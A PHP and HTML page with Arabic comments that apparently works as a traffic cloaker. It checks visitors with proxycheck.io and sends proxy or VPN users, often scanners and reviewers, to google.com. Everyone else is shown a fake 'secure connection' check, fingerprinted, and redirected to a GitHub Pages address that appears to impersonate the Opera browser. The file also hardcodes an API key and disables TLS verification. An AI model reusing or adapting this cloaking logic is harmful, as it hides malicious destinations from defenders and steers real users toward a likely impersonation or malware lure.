<?php
// --- 1. الإعدادات الأساسية ---
$API_KEY = "9a3qj1-ia8bq4-62sjl1-836307"; // مفتاح ProxyCheck
$REDIRECT_DELAY = 3000; // وقت الانتظار (مللي ثانية)
$TARGET_URL_PROXY = "https://google.com"; // رابط التوجيه عند كشف البروكسي

// الرابط النظيف (القالب) - كما طلبته بالضبط
$CLEAN_URL_TEMPLATE = "https://opera-browser.github.io";

// --- 2. دوال الكشف (Detection Functions) ---

// جلب الدولة
function getCountryCode($ip) {
    if ($ip == '127.0.0.1') return 'xx';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/{$ip}?fields=countryCode");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $data = json_decode(curl_exec($ch), true);
    curl_close($ch);
    return strtolower($data['countryCode'] ?? 'xx');
}

// تحليل User Agent
function parseUserAgent() {
    $agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $os = 'Unknown'; $device = 'desktop'; $browser = 'Other';

    // OS
    if (preg_match('/windows/i', $agent)) $os = 'Windows';
    elseif (preg_match('/macintosh|mac os x/i', $agent)) $os = 'Mac';
    elseif (preg_match('/iphone/i', $agent)) $os = 'iOS';
    elseif (preg_match('/android/i', $agent)) $os = 'Android';
    elseif (preg_match('/linux/i', $agent)) $os = 'Linux';

    // Device
    if (preg_match('/mobile|android|iphone|ipad/i', $agent)) $device = 'mobile';
    elseif (preg_match('/tablet|ipad/i', $agent)) $device = 'tablet';

    // Browser
    if (preg_match('/chrome/i', $agent)) $browser = 'Chrome';
    elseif (preg_match('/firefox/i', $agent)) $browser = 'Firefox';
    elseif (preg_match('/safari/i', $agent)) $browser = 'Safari';
    elseif (preg_match('/edge/i', $agent)) $browser = 'Edge';

    return ['os' => $os, 'device' => $device, 'browser' => $browser];
}

// --- 3. التنفيذ والمنطق ---
$visitor_ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

// فحص البروكسي
$ch = curl_init("https://proxycheck.io/v2/{$visitor_ip}?key={$API_KEY}&vpn=1");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$proxy_data = json_decode(curl_exec($ch), true);
curl_close($ch);

$is_proxy = false;
if (isset($proxy_data['status']) && $proxy_data['status'] == 'ok') {
    $ip_info = $proxy_data[$visitor_ip];
    if ((isset($ip_info['proxy']) && $ip_info['proxy'] == 'yes') || (isset($ip_info['type']) && $ip_info['type'] == 'VPN')) {
        $is_proxy = true;
    }
}

// إعداد متغيرات العرض
$ui_status = $is_proxy ? 'proxy' : 'clean';
$ui_text = $is_proxy ? 'اتصال غير آمن (Proxy/VPN)' : 'اتصال آمن وسليم ✅';
$ui_color = $is_proxy ? 'text-red' : 'text-green';

// تجهيز الرابط النهائي
$final_redirect_url = "";

if ($is_proxy) {
    $final_redirect_url = $TARGET_URL_PROXY;
} else {
    // 1. جمع البيانات
    $ua = parseUserAgent();
    $country = getCountryCode($visitor_ip);
    $lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en', 0, 2);
    
    // جلب البيانات القادمة من الرابط الأساسي (مثل siteid إذا كان موجوداً في الـ URL تبع الصفحة)
    $clickid = $_GET['clickid'] ?? ''; 
    $siteid = $_GET['siteid'] ?? '';
    $category = $_GET['category'] ?? '';

    // 2. استبدال التوكناز (Placeholders) في الرابط القالب
    $replacements = [
        '[clickid]' => $clickid,
        '[siteid]' => $siteid,
        '[category]' => $category,
        '[operatingsystem]' => $ua['os'], // انتبه: الرابط يستخدم operatingsystem
        '[device]' => $ua['device'],
        '[browser]' => $ua['browser'],
        '[cc]' => $country,
        '[language]' => $lang
        // [connection] سيتم استبداله في الجافاسكربت
    ];

    $final_redirect_url = str_replace(array_keys($replacements), array_values($replacements), $CLEAN_URL_TEMPLATE);
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري الفحص...</title>
    <style>
        body { font-family: system-ui, sans-serif; background: #121212; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .container { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 90%; max-width: 450px; }
        .spinner { width: 40px; height: 40px; border: 4px solid #333; border-top-color: #007bff; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .text-green { color: #28a745; }
        .text-red { color: #dc3545; }
        h2 { font-size: 1.5rem; margin-bottom: 10px; }
        p { color: #aaa; }
    </style>
</head>
<body>

<div class="container">
    <div id="loader">
        <h2>جاري التحقق من الاتصال...</h2>
        <div class="spinner"></div>
    </div>
    
    <div id="result" style="display:none;">
        <h2 class="<?php echo $ui_color; ?>"><?php echo $ui_text; ?></h2>
        <p>سيتم تحويلك خلال لحظات...</p>
        <div class="spinner"></div>
    </div>
</div>

<script>
    const isProxy = <?php echo $is_proxy ? 'true' : 'false'; ?>;
    let redirectUrl = "<?php echo $final_redirect_url; ?>";
    const delay = <?php echo $REDIRECT_DELAY; ?>;

    // دالة تحديد نوع الاتصال (WiFi/4G)
    function getConnectionType() {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        return conn ? (conn.effectiveType || 'unknown') : 'unknown';
    }

    setTimeout(() => {
        document.getElementById('loader').style.display = 'none';
        document.getElementById('result').style.display = 'block';

        setTimeout(() => {
            // إذا كان الترافيك نظيف، نستبدل [connection] بالقيمة الحقيقية
            if (!isProxy) {
                const connType = getConnectionType();
                // استبدال النص [connection] في الرابط بقيمة الاتصال
                redirectUrl = redirectUrl.replace('[connection]', connType);
            }
            
            window.location.replace(redirectUrl);
        }, delay);

    }, 1500);
</script>

</body>
</html>
